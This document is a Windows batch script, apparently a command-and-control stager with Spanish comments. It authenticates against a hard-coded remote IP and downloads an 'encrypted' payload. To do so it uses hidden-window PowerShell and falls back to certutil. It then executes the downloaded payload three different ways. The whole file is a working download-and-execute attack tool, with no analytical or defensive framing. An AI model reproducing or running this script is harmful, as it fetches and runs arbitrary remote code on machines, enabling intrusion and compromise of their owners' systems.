@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title C2 Anti-Hang Debug

echo.
echo [INFO] 🔥 C2 ANTI-HANG - DEBUG TOTAL 🔥
echo.

set "BASE=http://82.29.153.101:8080"
set "AUTH=%TEMP%\auth.json"
set "PAYLOAD=%TEMP%\payload.bat"
set "LOG=%TEMP%\c2_debug.log"

:: =====================================================
:: [1] AUTH CON TIMEOUT + ERROR CHECK
:: =====================================================
echo [INFO] [1/4] 🔑 AUTH (10s timeout)...
powershell -NoProfile -WindowStyle Hidden -Command ^
 "try { ^
  $r = iwr '%BASE%/auth/key' -UseBasicParsing -TimeoutSec 10; ^
  $r.Content | Out-File '%AUTH%' UTF8; ^
  Write-Host 'AUTH_OK'; exit 0 ^
 } catch { ^
  Write-Host 'AUTH_FAIL:' $_.Exception.Message; exit 1 ^
 }"

if %ERRORLEVEL% neq 0 (
    echo [ERROR] AUTH TIMEOUT/FAIL
    goto :fail
)

echo [DEBUG] AUTH RAW:
type "%AUTH%"
echo.

:: PARSE JSON SEGURO
powershell -NoProfile -Command ^
 "try { ^
  $j = Get-Content '%AUTH%' -Raw | ConvertFrom-Json; ^
  $j.nonce | Out-File '%TEMP%\nonce.txt' UTF8; ^
  $j.token | Out-File '%TEMP%\token.txt' UTF8 ^
 } catch { exit 1 }"

if %ERRORLEVEL% neq 0 goto :fail_parse

set /p NONCE=<"%TEMP%\nonce.txt"
set /p TOKEN=<"%TEMP%\token.txt"
del "%TEMP%\nonce.txt" "%TEMP%\token.txt" "%AUTH%" 2>nul

echo [DEBUG] NONCE=%NONCE%
echo [DEBUG] TOKEN=%TOKEN:~0,10%...
echo.

:: =====================================================
:: [2] DOWNLOAD CON 4 MÉTODOS + TIMEOUT
:: =====================================================
echo [INFO] [2/4] 📥 DOWNLOAD (15s timeout)...
echo [DEBUG] Intentando PowerShell...

powershell -NoProfile -WindowStyle Hidden -Command ^
 "try { ^
  $h = @{ 'X-Nonce'='%NONCE%'; 'X-Token'='%TOKEN%' }; ^
  $r = iwr '%BASE%/payload/encrypted' -Headers $h -UseBasicParsing -TimeoutSec 15; ^
  $r.Content | Out-File '%PAYLOAD%' UTF8; ^
  Write-Host ('DOWNLOAD_OK:' + ($r.Content.Length) + 'bytes'); exit 0 ^
 } catch { ^
  Write-Host ('DOWNLOAD_FAIL:' + $_.Exception.Message); exit 1 ^
 }"

if %ERRORLEVEL% equ 0 if exist "%PAYLOAD%" goto :download_ok

echo [WARN] PowerShell falló, probando certutil...
certutil -urlcache -split -f "%BASE%/payload/encrypted" "%PAYLOAD%" >nul 2>&1
if exist "%PAYLOAD%" goto :download_ok

echo [ERROR] [2/4] TODOS LOS MÉTODOS FALLARON
goto :fail

:download_ok
for %%F in ("%PAYLOAD%") do echo [DEBUG] DOWNLOAD ✓ %%~zF bytes
echo.

:: =====================================================
:: [3] PREVIEW
:: =====================================================
echo [INFO] [3/4] 👁️ PREVIEW:
type "%PAYLOAD%"
echo.

:: =====================================================
:: [4] EJECUCIÓN REAL
:: =====================================================
echo [INFO] [4/4] 🚀 EJECUTANDO...
echo 🔥 M1: call directo
call "%PAYLOAD%"

echo 🔥 M2: cmd /c
cmd /c "%PAYLOAD%"

echo 🔥 M3: background
start /min cmd /c "%PAYLOAD%"

echo.
echo [SUCCESS] 🎉 MISSION COMPLETE 🎉
echo [INFO] Payload: %PAYLOAD%
goto :end

:fail_parse
echo [ERROR] JSON PARSE FAIL
goto :end

:fail
echo [ERROR] DOWNLOAD/ AUTH FAIL
type "%TEMP%\c2_debug.log" 2>nul
goto :end

:end
pause